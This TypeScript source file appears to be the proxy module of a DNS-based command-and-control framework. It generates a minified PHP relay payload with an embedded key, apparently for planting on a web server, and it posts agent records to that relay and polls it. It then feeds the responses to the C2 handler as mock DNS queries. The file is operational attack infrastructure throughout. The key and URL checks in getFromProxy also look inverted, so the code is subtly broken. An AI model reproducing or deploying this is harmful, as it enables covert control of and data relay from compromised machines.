import axios from "axios";
import * as fs from "fs";
import { Constants, emsg } from "../utils/utils";
import BaseModule from "./base";
import Logger from "../lib/logger";

const MODULE_DESCRIPTION = "manage the proxy configuration";

export default class ProxyModule extends BaseModule {
    fetchTimer: NodeJS.Timeout | null;
    log: Logger;
    payload: string;

    constructor(protected configFile: string, protected c2Domain: string, protected c2MessageHandler: Function) {
        super("proxy", configFile);
        this.log = new Logger();

        this.description = MODULE_DESCRIPTION;

        this.fetchTimer = null;
        this.payload = "";

        this.config = this.loadConfig();

        this.defineCommands({
            fetch: {
                arguments: [],
                description: "force a fetch from the proxy",
                execute: this.proxyFetch,
            },
            generate: {
                arguments: [],
                description: "generate proxy payload with the specified key",
                execute: this.run,
            },
            "set url": {
                arguments: ["<url>"],
                description: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                validateRegex: Constants.VALID_URL_REGEX,
                execute: (params: string[]) => {
                    this.config.url = params[0];
                },
            },
            "set enabled": {
                arguments: ["<1|0>"],
                description: "enable or disable proxy communication channel",
                execute: (params: string[]) => {
                    this.config.enabled = params[0] != "0" && params[0] != "false" ? true : false;
                },
            },
            "set key": {
                arguments: ["<key>"],
                description: "key to use for proxy communication",
                execute: (params: string[]) => {
                    this.config.key = params[0];
                },
            },
            "set interval": {
                arguments: ["<ms>"],
                description: "how often to fetch data from proxy, in ms",
                execute: (params: string[]) => {
                    this.config.interval = Number(params[0]) || this.config.interval;
                },
            },
        });
    }

    run() {
        if (!this.config.key) throw new Error(`proxy key is required, see 'help'`);

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync("payloads/proxy.php");
            proxyPhp = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");
        proxyPhp = proxyPhp.replace(/\n/g, "");
        proxyPhp = proxyPhp.replace(/\s{2,}/g, "");

        this.payload = `<?php ${proxyPhp} ?>`;
        return { message: `proxy payload set: \n${this.payload}` };
    }

    async sendToProxy(agentId: string, records: string[]) {
        const recordsString = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: recordsString,
            k: this.config.key,
            i: agentId,
            p: "c",
        };

        try {
            const res = await axios.post(this.config.url, data);
            this.log.debug(`proxy send response: ${res.data}`);
        } catch (ex) {
            this.log.error(`failed to send data to proxy: ${emsg(ex)}`);
        }
        return;
    }

    getFromProxy() {
        if (!this.config.enabled) {
            this.log.error(`proxy is not enabled: try 'set enabled 1'`);
            return;
        }
        if (this.config.url) {
            // this.log.error(`proxy is missing the url: see 'help'`);
            return;
        }
        if (this.config.key) {
            // this.log.error(`proxy is missing a key: see 'help'`);
            return;
        }

        const data = {
            url: this.config.url,
            form: {
                k: this.config.key,
                f: "a",
            },
        };

        return axios
            .post(this.config.url, data)
            .then((result) => this.processProxyData(result.data))
            .catch((ex) => {
                this.log.error(`proxy fetch failed: ${emsg(ex)}`);
            });
    }

    processProxyData(proxyData: string) {
        // we expect the proxy to respond with ERR 1, or similar
        // this.this.log.debug(`proxy response:\n${proxyData}`);
        if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);

        // grab proxy response and build mock dns queries
        let data = proxyData.replace(/;$/, "").split(";");
        data.forEach((q) => {
            let req = {
                connection: {
                    remoteAddress: this.config.url,
                    type: "PROXY",
                },
            };
            let res = {
                question: [
                    {
                        type: "PROXY",
                        name: `${q}.${this.c2Domain}`,
                    },
                ],
                answer: [],
                end: () => {},
            };
            this.c2MessageHandler(req, res);
        });
    }

    proxyFetch() {
        this.getFromProxy();
        return { message: "fetching data from proxy..." };
    }

    proxyEnable() {
        const message = this.config.enabled ? `starting proxy checkin at interval: ${this.config.interval}ms` : `stopping proxy checkin`;

        this.proxyFetchLoop();
        return { message: message };
    }

    /**
     * Proxy loop
     */
    proxyFetchLoop() {
        if (this.fetchTimer) clearTimeout(this.fetchTimer);
        if (!this.config.enabled) return;

        this.getFromProxy()?.finally(() => {
            this.fetchTimer = setTimeout(() => {
                this.proxyFetchLoop();
            }, this.config.interval);
        });
    }
}
